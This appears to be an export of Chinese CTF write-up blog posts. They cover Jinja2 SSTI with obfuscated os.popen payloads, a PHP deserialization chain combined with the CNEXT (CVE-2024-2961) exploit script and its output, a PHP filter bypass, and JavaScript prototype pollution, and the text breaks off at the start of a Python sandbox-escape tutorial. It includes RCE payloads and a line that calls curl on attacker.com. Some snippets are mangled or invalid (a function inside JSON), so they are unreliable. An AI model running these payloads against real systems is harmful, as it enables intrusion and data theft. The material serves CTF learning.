((cycler.next[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;u\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;p\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;r\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;c\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;/\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;f\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;4\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;).read() }} \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;请告诉我你的名字~\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;请告诉我你的名字：\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;kimi no namai wa?\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Your Name:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;Type Your Name Here\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;alert alert-info\u0026#34;\u0026gt;你是... nsilab{71e70fed-9cf5-48d3-aa28-13c3ebaa3ebb} 吗？\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 得到flag\n同时我也在NSSCTF上找到同样使用焚靖的SSTI，这里记录一下：\n[HZNUCTF 2023 preliminary]flask\n创建实例发现确实是SSTI，但是它会把传递的所有参数都反写\n1 2 3 http://node5.anna.nssctf.cn:21944/?name={a+b} 回显: hello! }b a{ 所以我们需要写个脚本来处理一下我们的输入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 python from flask import Flask, request, jsonify import requests app = Flask(__name__) @app.route(\u0026#39;/proxy\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def proxy(): name = request.args.get(\u0026#39;name\u0026#39;) # 1. 验证 name 参数是否有效 if not name: return jsonify(error=\u0026#34;Missing \u0026#39;name\u0026#39; parameter\u0026#34;), 400 try: reversed_name = name[::-1] # 反转名字 result = to_proxy(reversed_name) return result except Exception as e: return jsonify(error=str(e)), 500 def to_proxy(name): base_url = \u0026#34;http://node5.anna.nssctf.cn:21944/\u0026#34; params = {\u0026#39;name\u0026#39;: name} # 使用参数字典避免手动拼接 try: # 2. 使用 requests 的参数化 URL 并设置超时 resp = requests.get(base_url, params=params, timeout=5) resp.raise_for_status() # 检查 HTTP 错误（如 404、500） return resp.text except requests.exceptions.RequestException as e: raise Exception(f\u0026#34;Proxy request failed: {str(e)}\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=30000, debug=False) 然后使用焚靖\nfenjing crack -u \u0026ldquo;http://198.18.0.1:30000/proxy\u0026rdquo; -i name -m GET \u0026ndash;detect-mode fast\nls 发现只有\nhello! app.py require.txt env看看环境变量\n$\u0026gt;\u0026gt; env INFO:[full_payload_gen] | Start generating final expression... INFO:[payload_gen] | Great, string('env') can be 'e'+'n'+'v' INFO:[payload_gen] | Great, we generate os_popen_obj('env') INFO:[payload_gen] | Great, we generate os_popen_read('env') INFO:[cli] | Submit payload {%print (((((cycler|attr('n'+'e'+'x'+'t')|attr('_'+'_'+'g'+'l'+'o'+'b'+'a'+'l'+'s'+'_'+'_')|attr('_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_'))('_'+'_'+'b'+'u'+'i'+'l'+'t'+'i'+'n'+'s'+'_'+'_')|attr('_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_'))('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_'))('o'+'s')|attr('p'+'o'+'p'+'e'+'n'))('e'+'n'+'v')|attr('r'+'e'+'a'+'d'))()%} hello! HOSTNAME=8f82eec3db4b4210 PYTHON_PIP_VERSION=20.1 HOME=/root GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568 WERKZEUG_SERVER_FD=3 PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON_VERSION=3.8.2 PWD=/app PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348 FLAG=NSSCTF{f9f794c5-47f3-47b2-b473-4881097d212f} 得到flag\n3.fileread\r提示cnext\ncnext是 PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）\nGNU C 是一个标准的ISO C依赖库。在GNU C中，iconv()函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。\n如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用iconv()的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。\n先来看看反序列化\n源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 \u0026lt;?php class Smile { public $hello = \u0026#39;\u0026#39;; public $user = \u0026#39;guest\u0026#39;; function show() { if ($this-\u0026gt;user == \u0026#39;adm1n\u0026#39;) { echo \u0026#39;Hello admin, here is your flag: \u0026#39;.$this-\u0026gt;hello-\u0026gt;flag; } else { echo \u0026#39;Hello \u0026#39;.$this-\u0026gt;user; highlight_file(__FILE__); } } function __destruct() { $this-\u0026gt;show(); } function __invoke() { if (preg_match(\u0026#39;/^hello$/\u0026#39;, $this-\u0026gt;hello)) { echo \u0026#34;flag就是那个在根目录下的flag\u0026#34;; } } } class Lucky { public $chmod = \u0026#39;0700\u0026#39;; public $filename = \u0026#39;\u0026#39;; function __wakeup() { $this-\u0026gt;filename = $_GET[\u0026#39;file\u0026#39;]; } function __toString() { echo \u0026#34;Your File: \u0026#34;.file_get_contents($this-\u0026gt;filename).\u0026#34;\\n\\n\u0026#34;; return \u0026#39;huh?\u0026#39;; } } class Happy { public $func = \u0026#39;\u0026#39;; public $param = []; function call_func($func) { if (!$this-\u0026gt;param) { call_user_func(\u0026#39;phpinfo\u0026#39;); } else { call_user_func($func, \u0026#34;locked\u0026#34;); } } function __get($var) { if ($this-\u0026gt;func) { $this-\u0026gt;call_func($this-\u0026gt;func); } else { die(); } return \u0026#39;hacker!\u0026#39;; } } function Yeah($ser) { unserialize(base64_decode($ser)); } @error_reporting(0); if (!empty($_GET)) { $param = $_GET[\u0026#39;p\u0026#39;]; call_user_func(\u0026#34;Yeah\u0026#34;, $param); } else { $face = new Smile(); die(); } ?\u0026gt; pop链是__destruct()-\u0026gt; __get -\u0026gt; __invoke() -\u0026gt; __toString()\n1 2 3 4 php echo base64_encode(serialize(new Smile(new Happy(new Smile(new Lucky(\u0026#39;0700\u0026#39;,\u0026#39;\u0026#39;),\u0026#39;\u0026#39;),\u0026#39;114\u0026#39;),\u0026#39;adm1n\u0026#39;))); //Tzo1OiJTbWlsZSI6Mjp7czo1OiJoZWxsbyI7Tzo1OiJIYXBweSI6Mjp7czo0OiJmdW5jIjtPOjU6IlNtaWxlIjoyOntzOjU6ImhlbGxvIjtPOjU6Ikx1Y2t5IjoyOntzOjU6ImNobW9kIjtzOjQ6IjA3MDAiO3M6ODoiZmlsZW5hbWUiO3M6MDoiIjt9czo0OiJ1c2VyIjtzOjA6IiI7fXM6NToicGFyYW0iO3M6MzoiMTE0Ijt9czo0OiJ1c2VyIjtzOjU6ImFkbTFuIjt9 我们使用可以自动利用cnext漏洞的脚本：\nCNEXT exploits\n改下脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 python ...... class Remote: def __init__(self, url: str) -\u0026gt; None: self.url = url self.session = Session() def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; return self.session.get(\u0026#34;http://contest.ctf.nefu.edu.cn:33069/? p=Tzo1OiJTbWlsZSI6Mjp7czo1OiJoZWxsbyI7Tzo1OiJIYXBweSI6Mjp7czo0OiJmdW5jIjtPOjU6IlNt aWxlIjoyOntzOjU6ImhlbGxvIjtPOjU6Ikx1Y2t5IjoyOntzOjU6ImNobW9kIjtzOjQ6IjA3MDAiO3M6OD oiZmlsZW5hbWUiO3M6MDoiIjt9czo0OiJ1c2VyIjtzOjU6Imd1ZXN0Ijt9czo1OiJwYXJhbSI7czozOiIx MTEiO31zOjQ6InVzZXIiO3M6NToiYWRtMW4iO30=\u0026#34;, params={\u0026#34;file\u0026#34;: path}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; response = self.send(path) data = response.re.search(\u0026#34;Your File: (.*)\\n\\n\u0026#34;, flags=re.S).group(1) return base64.decode(data) ...... bash ┌──(kali㉿kali)-[~/cnext-exploits] └─$ python3 cnext-exploit.py http://contest.ctf.nefu.edu.cn:33100/ \u0026#39;ls -a / \u0026gt; 1.txt\u0026#39; [*] The data:// wrapper works [*] The php://filter/ wrapper works [*] The zlib extension is enabled [+] Exploit preconditions are satisfied [*] Using 0x7fdfdb200040 as heap EXPLOIT SUCCESS 查看根目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 . .. .dockerenv bin boot dev etc flag home lib lib64 media mnt opt proc readflag root run sbin srv start.sh sys tmp usr var 这里有readflag，听夏师傅说这里是SUID，所以直接运行readflag\n1 2 3 4 5 6 7 8 9 10 bash ┌──(kali㉿kali)-[~/cnext-exploits] └─$ python3 cnext-exploit.py http://contest.ctf.nefu.edu.cn:33100/ \u0026#39;/./readflag \u0026gt; 1.txt\u0026#39; [*] The data:// wrapper works [*] The php://filter/ wrapper works [*] The zlib extension is enabled [+] Exploit preconditions are satisfied [*] Using 0x7fdfdb200040 as heap EXPLOIT SUCCESS 得到flag\n","date":"2025-06-01T10:30:20+08:00","permalink":"https://Oight.github.io/p/nsilab%E6%B7%98%E6%B1%B0%E8%B5%9B%E5%A4%8D%E7%8E%B0/","title":"NSILAB淘汰赛复现"},{"content":"1.sign in\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php error_reporting(0); include_once \u0026#39;flag.php\u0026#39;; if ($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) { if (preg_match(\u0026#34;/[A-Za-z]+/\u0026#34;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;])) { die(\u0026#34;I hate English!\u0026#34;); } if (substr(md5($_POST[\u0026#39;nsilab\u0026#39;]), 0, 4) !== \u0026#34;ba3f\u0026#34; || $_GET[\u0026#39;hi\u0026#39;] !== \u0026#34;web\u0026#34;) { die(\u0026#34;Oops! It\u0026#39;s wrong!\u0026#34;); } if ($_COOKIE[\u0026#39;user\u0026#39;] !== \u0026#39;admin\u0026#39;) { die(\u0026#34;You are not admin!\u0026#34;); } locate(); } else { highlight_file(__FILE__); } ?\u0026gt; 三层过滤 以下是对该PHP代码的详细解释及解题思路：\n代码逻辑分析\r错误报告与文件包含：\n1 2 3 php error_reporting(0); // 关闭错误显示 include_once \u0026#39;flag.php\u0026#39;; // 包含flag文件（关键目标） 查询字符串检查：\n1 2 3 4 5 6 7 8 9 10 php if ($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) { // 检查查询字符串是否包含字母 if (preg_match(\u0026#34;/[A-Za-z]+/\u0026#34;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;])) { die(\u0026#34;I hate English!\u0026#34;); } // 其他条件... } else { highlight_file(__FILE__); // 无查询字符串时显示源码 } 漏洞点：$_SERVER['QUERY_STRING'] 是原始未解码的字符串，可通过URL编码绕过字母检测。 MD5校验与参数检查：\n1 2 3 4 php if (substr(md5($_POST[\u0026#39;nsilab\u0026#39;]), 0, 4) !== \u0026#34;ba3f\u0026#34; || $_GET[\u0026#39;hi\u0026#39;] !== \u0026#34;web\u0026#34;) { die(\u0026#34;Oops! It\u0026#39;s wrong!\u0026#34;); } 要求POST参数 nsilab 的MD5值前4位为 ba3f。 GET参数 hi 必须等于 web。 Cookie权限校验：\n1 2 3 4 php if ($_COOKIE[\u0026#39;user\u0026#39;] !== \u0026#39;admin\u0026#39;) { die(\u0026#34;You are not admin!\u0026#34;); } 需设置Cookie user=admin。 成功条件：\n1 2 php locate(); // 猜测此函数会输出flag 解题步骤\r1. 绕过查询字符串字母检测\r目标：传递 hi=web，但确保 QUERY_STRING 无字母。\n方法\n：将参数名和值URL编码为十六进制形式：\nhi → %68%69（h的ASCII码是0x68，i是0x69） web → %77%65%62（w=0x77, e=0x65, b=0x62） 构造查询字符串\n：\n1 2 plaintext ?%68%69=%77%65%62 $_SERVER['QUERY_STRING'] 为 %68%69=%77%65%62（无字母）。 PHP自动解码后，$_GET['hi'] 为 web。 2. 碰撞MD5前4位为ba3f\r目标：找到字符串 nsilab，满足 md5(nsilab)[0:4] == \u0026quot;ba3f\u0026quot;。\n暴力破解脚本\n：\n1 2 3 4 5 6 7 8 9 10 11 python import hashlib target = \u0026#34;ba3f\u0026#34; for i in range(1000000): s = str(i) hash_md5 = hashlib.md5(s.encode()).hexdigest() if hash_md5.startswith(target): print(f\u0026#34;Found: {s} → {hash_md5}\u0026#34;) break // Found: 35350 → ba3fe3d296f3e7269b66f163d31b3dc3 示例结果：nsilab=35350 3. 设置管理员Cookie\r添加Cookie：user=admin。 4. 发送完整请求\r1 2 3 4 5 6 7 http GET /?%68%69=%77%65%62 HTTP/1.1 Host: target.com Cookie: user=admin Content-Type: application/x-www-form-urlencoded nsilab=12345 漏洞总结\r漏洞类型 利用方法 防御建议 URL编码绕过 参数名和值URL编码为十六进制 检查解码后的参数 MD5弱校验 暴力碰撞前4位 使用强哈希（如SHA-256） Cookie权限控制不严 直接设置Cookie为user=admin 服务端Session管理或签名Cookie 最终Payload示例\r1 2 3 4 bash curl -X GET \u0026#34;http://contest.ctf.nefu.edu.cn:33079/\u0026#34; \\ -H \u0026#34;Cookie: user=admin\u0026#34; \\ -d \u0026#34;nsilab=35350\u0026#34; 成功触发后，服务器会执行 locate() 函数并返回flag。\n2.ezssti\r输入49 发现可以SSTI 使用焚靖 get 方法传name\ncd .. \u0026amp;\u0026amp; ls -a\n得到隐藏的.flll4ggggg文件 用tac /.flll4ggggg得到flag\nArt\r学姐手把手教学，效果显著（）\r灵感来源：Artfuscator\nIDA打开，进入main函数\nCtrl 加滚轮放大\n就能看到flag\n","date":"2025-06-01T10:30:04+08:00","permalink":"https://Oight.github.io/p/%E6%B7%98%E6%B1%B0%E8%B5%9B/","title":"淘汰赛"},{"content":"原型链污染\r什么是原型链污染？\r原型链污染是一种针对JavaScript运行时的注入攻击。\n在 JavaScript 中，通过修改对象的原型（prototype），让所有继承该原型的对象都“被动继承”这些修改，可能导致意外行为或安全漏洞。\n通过原型链污染，攻击者可以控制对象属性的默认值，从而篡改应用程序的逻辑并可能导致服务被拒绝，甚至在某些极端情况下远程执行代码。\n通俗地讲，想想你是一家车厂的老板，所有汽车都按照一个 标准模板 生成，这个模板就是 原型。有一天，有人在模板上偷偷画了个鬼脸，结果之后生产的每辆车都带着这个鬼脸——这就是原型链污染。\n为什么会发生原型链污染？\r原型链机制 JavaScript 中对象可以继承属性和方法。为了使得在编写程序时更加简便，避免由于方法绑定到对象上在使用时多次调用，利用原型（prototype）就可以使得所有用同一类来实例化的对象可以直接拥有这个类中的所有内容，包括属性和方法。\nJavaScript 中的继承机制：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 javascript funtion Father() { this.first_name = \u0026#39;Donald\u0026#39; this.last_name = \u0026#39;Trump\u0026#39; } funtion Son() { this.first_name = \u0026#39;Melania\u0026#39; } Son.prototype = new Father() let Son = new Son() console.log(`name: ${son.first_name} ${son.last_name}`) // 最后输出Name : Melania Trump 总结一下，对于对象 son ，在调用 son.last_name 的时候，实际上 JavaScript 引擎会进行如下操作：\n1.在对象 son 中寻找 last_name 2.如果找不到，则在son.__proto__中寻找 last_name 3.如果仍然找不到，则继续在son.__proto__.__proto__中寻找 last_name 4.依次寻找，直到找到 null 结束。比如，Object.prototype的__proto__就是 null\nJavaScript 的这个查找的机制，被运用在面向对象的继承中，被称作 prototype 继承链。\n但是这一操作也使得一旦可以修改对象的原型，将使得所有的对象都被修改，从而导致安全隐患。\n例如：\n1 2 3 javascript const cat1 = {}; // 普通对象 car1.toString(); // 调用的时Object.prototype.toString 如果修改了Object.orototype.toString,所有对象的toString方法都会变。\n举一个实际利用中的例子\n假设一个网站允许用户提交JSON数据：\n1 2 3 javascript const userData = JSON.parse(\u0026#39;{\u0026#34;__proto__\u0026#34;:\u0026#34;isAdmin: true\u0026#34;}\u0026#39;); // 用户提交的数据中偷偷加了__proto__.isAdmin = true 此时，Object.prototype.isAdmin被设置为 true ，所有对象都会继承这个属性：\n1 2 3 javascript const normalUser = {}; console.log(normalUser.isAdmin); // 输出true，(本不该有管理权限) 具体在CTF中的应用\r如何判断题目设计原型链污染？\r1.代码审计\n对象合并操作：题目代码中出现Object.assign()、lodash.marge()、JSON.parse()等函数 动态属性赋值：如obj[key] = value,其中key或value来自用户输入 原型链关键词：代码中显式使用__proto__、prototype、constructor 2.黑箱测试特征\n权限异常：普通用户突然拥有管理员权限，(如访问/admin 路由) 全局属性篡改: 所有对象自动继承某个属性(如 token 、isAdmin ) 行为突变： 调用默认方法(如toString())时返回意外结果 3.验证方法\n提交测试Payload：\n1 {\u0026#34;__proto__\u0026#34;: {\u0026#34;test\u0026#34;: 123}} 检查响应：\n创建新对象 const obj = {};，观察 obj.test 是否为 123。 若成功，说明原型链被污染。 突破口与利用场景\r1.常见输入点：\nJSON数据提交：通过POST请求体传递恶意Payload。 URL参数或查询字符串：如 ?key=proto.isAdmin\u0026amp;value=true。 表单字段：用户可控的表单字段名或值。 2.敏感属性覆盖：\n权限标志：isAdmin、isVIP、role。 身份凭证：token、session。 函数重写：覆盖 toString()、valueOf() 等原型方法，触发逻辑漏洞。 3.依赖库漏洞：\nLodash（CVE-2019-10744）：旧版本的 _.defaultsDeep 未过滤 proto。 Express.js中间件：解析请求体时未过滤特殊属性。 具体操作步骤\r步骤一：构建Payload\n基础Payload：\n1 2 json {\u0026#34;__proto__\u0026#34;:{\u0026#34;isAdmin\u0026#34;: true}} 绕过过滤的变种：\nUnicode编码： 1 2 json {\u0026#34;\\u005F_proto__\u0026#34;: {\u0026#34;isAdmin\u0026#34;: true}} 嵌套污染： 1 2 json {\u0026#34;constructor\u0026#34;: {\u0026#34;prototype\u0026#34;: {\u0026#34;isAdmin\u0026#34;: true}}} 步骤2：触发漏洞\n场景1：对象合并（如 Object.assign）： 1 2 3 4 5 javascript // 服务端代码示例 const userInput = JSON.parse(req.body.data); const config = { theme: \u0026#34;light\u0026#34; }; Object.assign(config, userInput); // 污染点 Payload提交：\n1 {\u0026#34;__proto__\u0026#34;: {\u0026#34;isAdmin\u0026#34;: true}} 场景2：动态属性赋值： 1 2 3 4 // 服务端代码示例 const key = req.query.key; // 用户可控 const value = req.query.value; obj[key] = value; Payload提交：\n1 GET /api/set?key=**proto**.isAdmin\u0026amp;value=true plaintext\n步骤3：验证污染效果\n直接检查原型属性： 1 console.log(Object.prototype.isAdmin); // 输出应为 true 触发敏感逻辑：\n访问需要管理员权限的接口（如 /admin）。 调用被覆盖的方法： 1 2 3 javascript const obj = {}; console.log(obj.toString()); // 若覆盖为恶意函数，可能触发XSS或RCE 步骤4：高级利用（结合其他漏洞）\n远程代码执行（RCE）： 1 2 3 4 json {\u0026#34;__proto__\u0026#34;: { \u0026#34;exec\u0026#34;: \u0026#34;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl http://attacker.com\u0026#39;)\u0026#34; }} 信息泄露：\n1 2 3 4 json {\u0026#34;__proto__\u0026#34;: { \u0026#34;getSecret\u0026#34;: function() { return this.internalSecret; } }} 四、绕过防御的技巧\n1.属性名混淆：\n大小写变异：__PROTO__、__proto__。\n特殊字符插入：__pro__to__（部分过滤逻辑不严格）。\n2.多层嵌套污染：\n1 {\u0026#34;a\u0026#34;: {\u0026#34;b\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;isAdmin\u0026#34;: true}}}} 某些合并函数可能递归处理嵌套对象。\n3.利用库函数特性：\nLodash旧版本：_.merge 默认处理 proto。\njQuery.extend：需测试是否深拷贝原型属性。\n例题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // ... const lodash = require(\u0026#39;lodash\u0026#39;) // ... app.engine(\u0026#39;ejs\u0026#39;, function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =\u0026gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) //... app.all(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { let data = req.session.data || {language: [], category: []} if (req.method == \u0026#39;POST\u0026#39;) { data = lodash.merge(data, req.body) req.session.data = data } res.render(\u0026#39;index\u0026#39;, { language: data.language, category: data.category }) }) 解决步骤与原理详解\r1. 漏洞分析\r题目代码中使用了存在漏洞的 lodash.merge 方法合并用户输入（req.body），且未过滤 __proto__ 或 constructor 属性。旧版 Lodash（如 4.17.10 之前）的 merge 方法未正确处理原型链属性，导致攻击者可通过注入 __proto__ 污染全局对象原型。\n2. 漏洞利用步骤\r步骤1：确认漏洞存在\r测试Payload\n：发送以下 POST 请求，尝试污染\n1 Object.prototype ：\n1 2 3 4 5 6 json { \u0026#34;__proto__\u0026#34;: { \u0026#34;polluted\u0026#34;: \u0026#34;test\u0026#34; } } 验证污染\n：在后续请求中，检查任意对象的\n1 polluted 属性：\n1 2 3 javascript // 服务端代码示例 console.log({}.polluted); // 若输出 \u0026#34;test\u0026#34;，则污染成功 步骤2：利用污染实现RCE\r目标是通过污染原型链，在模板渲染时触发代码执行。 EJS模板特性：EJS 在渲染时，若模板中访问了对象属性，且该属性被污染为一个函数，则会执行该函数。\n构造恶意Payload： 覆盖 Object.prototype 的某个方法（如 toString），插入恶意代码：\n1 2 3 4 5 6 json { \u0026#34;__proto__\u0026#34;: { \u0026#34;toString\u0026#34;: \u0026#34;() =\u0026gt; { return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag\u0026#39;).toString() }\u0026#34; } } 或更隐蔽的方式：\n1 2 3 4 5 6 7 8 9 10 json { \u0026#34;constructor\u0026#34;: { \u0026#34;prototype\u0026#34;: { \u0026#34;toString\u0026#34;: function() { return this.flag ||= require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag\u0026#39;).toString(); } } } } 步骤3：触发模板渲染执行代码\r假设模板 index.ejs 中有如下代码：\n1 2 plaintext \u0026lt;%= language %\u0026gt; // 或其他输出点 当 language 未定义时，EJS 会尝试从原型链查找 language 属性。若 Object.prototype.language 被污染为恶意函数，则会执行该函数。\n最终Payload：\n1 2 3 4 5 6 7 8 json { \u0026#34;__proto__\u0026#34;: { \u0026#34;language\u0026#34;: function() { return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag\u0026#39;).toString(); } } } 步骤4：发送请求并获取flag\r发送POST请求\n：\n1 2 3 4 bash curl -X POST http://target.com/ \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;__proto__\u0026#34;: {\u0026#34;language\u0026#34;: function(){ return require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;cat /flag\u0026#34;).toString() }}}\u0026#39; 触发模板渲染： 访问首页 GET /，模板会尝试渲染 language 属性，执行污染后的函数，返回flag。\n3. 技术原理\r原型链污染：通过 lodash.merge 将 __proto__ 注入到 data 对象，污染 Object.prototype。 模板引擎触发：EJS 渲染时访问被污染属性（如 language），调用已覆盖的函数，执行任意命令。 RCE链： 污染函数 → 模板调用函数 → 执行系统命令 → 返回flag。 🤔\n关键点\n：\n识别 lodash.merge 合并用户输入。 构造 __proto__ 或 constructor.prototype 污染原型链。 利用模板引擎渲染触发恶意代码。 最终效果：通过污染 Object.prototype.language，在渲染时执行 cat /flag，直接获取flag。\n参考：\n深入理解 JavaScript Prototype 污染攻击\n","date":"2025-06-01T10:29:47+08:00","permalink":"https://Oight.github.io/p/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","title":"原型链污染"},{"content":"Python沙箱逃逸\r我们知道Python可以利用反序列化漏洞以及其他漏洞进行攻击，因此，在CTF中也会通过防火墙来进行防御。今天我们就讨论一下如何绕过防火墙来实现攻击行为，即Python的沙箱逃逸\n什么是Python沙箱\rPython 沙箱（Sandbox） 是一个隔离的代码执行环境，用于安全地运行不受信任的代码，防止其对宿主系统造成破坏。在Python中，沙箱通过限制代码的访问权限（如文件读写、网络请求、系统命令执行等），确保程序只能在可控范围内操作。\n比如在Python反序列化中，我们需要通过反序列化来让程序执行我们想让它执行的代码来实现相应的功能。在这个过程中，我们就借助了Python中的一些函数和模块来实现这些功能。\n同样的，为了避免安全风险，程序的设计者会想办法禁止我们利用这些危险的函数和模块。\n示例：（一个简单的Python沙箱）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 python # 创建一个禁用危险函数的环境 def safe_exec(code): allowed_builtins = {\u0026#34;abs\u0026#34;, \u0026#34;max\u0026#34;, \u0026#34;min\u0026#34;, \u0026#34;print\u0026#34;} # 白名单 restricted_globals = { \u0026#34;__builtins__\u0026#34;: {func: __builtins__[func] for func in allowed_builtins} } try: exec(code, restricted_globals) except Exception as e: print(\u0026#34;Blocked:\u0026#34;, e) # 测试安全执行 safe_exec(\u0026#34;print(\u0026#39;Hello World\u0026#39;)\u0026#34;) # 正常 safe_exec(\u0026#34;open(\u0026#39;test.txt\u0026#39;, \u0026#39;w\u0026#39;)\u0026#34;) # 报错：open 不可用 Python沙箱的实现原理和常见方法\rPython沙箱的核心是限制代码的执行权限\n常用方法： 模块和函数白名单/黑名单\n移除危险模块：禁用如 os、sys、subprocess 等模块。\n覆盖内置函数：替换 __import__、open、eval 等函数。\n示例：\n1 2 3 4 python # 禁用 os 模块 import sys sys.modules[\u0026#39;os\u0026#39;] = None # 阻止导入os 什么是Python沙箱逃逸\rPython 沙箱逃逸（Sandbox Escape）是指在一个受限制的Python执行环境（沙箱）中，通过技术手段绕过安全限制，访问或控制本应被禁止的资源（如文件系统、操作系统命令、网络等）。沙箱通常用于隔离不可信代码，但在设计不当时可能被攻击者突破。\n常用的 Python 内建函数\r在 Python 